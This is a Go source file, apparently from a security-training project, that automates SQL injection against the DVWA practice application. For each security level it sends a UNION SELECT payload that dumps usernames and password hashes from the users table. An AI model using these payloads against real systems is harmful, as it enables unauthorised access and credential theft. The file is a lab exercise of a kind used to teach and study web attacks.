package sqli

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"

	"github.com/jace-ys/cybersec/dvwa"
)

var (
	resultRe = regexp.MustCompile(`<br />First name: (?P<user>[a-z0-9]+)<br />Surname: (?P<password>[a-z0-9]+)</pre>`)
)

func Run(client *dvwa.Client) error {
	injector := NewSQLInjector(client)
	results, err := injector.Exploit()
	if err != nil {
		return err
	}

	for user, password := range results {
		fmt.Printf("Found user [%s] with password hash [%s]\n", user, password)
	}

	return nil
}

type SQLInjector struct {
	client *dvwa.Client
}

func NewSQLInjector(client *dvwa.Client) *SQLInjector {
	return &SQLInjector{
		client: client,
	}
}

func (i *SQLInjector) Exploit() (map[string]string, error) {
	var resp *http.Response
	var err error

	switch i.client.Security {
	case "low":
		query := `7' UNION SELECT user,password FROM users#`
		data := url.Values{
			"id":     {query},
			"Submit": {"Submit"},
		}

		resp, err = i.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli/?%s", i.client.Addr, data.Encode()))
		if err != nil {
			return nil, err
		}
	case "medium":
		query := `7 UNION SELECT user,password FROM users#`
		data := url.Values{
			"id":     {query},
			"Submit": {"Submit"},
		}

		resp, err = i.client.PostForm(fmt.Sprintf("http://%s/vulnerabilities/sqli/", i.client.Addr), data)
		if err != nil {
			return nil, err
		}
	case "high":
		query := `7' UNION SELECT user,password FROM users#`
		data := url.Values{
			"id":     {query},
			"Submit": {"Submit"},
		}

		resp, err = i.client.PostForm(fmt.Sprintf("http://%s/vulnerabilities/sqli/session-input.php", i.client.Addr), data)
		if err != nil {
			return nil, err
		}

		resp, err = i.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli/", i.client.Addr))
		if err != nil {
			return nil, err
		}
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	matches := resultRe.FindAllSubmatch(body, -1)
	if len(matches) == 0 {
		return nil, fmt.Errorf("could not get exploit result")
	}

	results := make(map[string]string)
	for _, match := range matches {
		if len(match) < 3 {
			return nil, fmt.Errorf("exploit result is malformed")
		}

		user, password := string(match[1]), string(match[2])
		results[user] = password
	}

	return results, nil
}
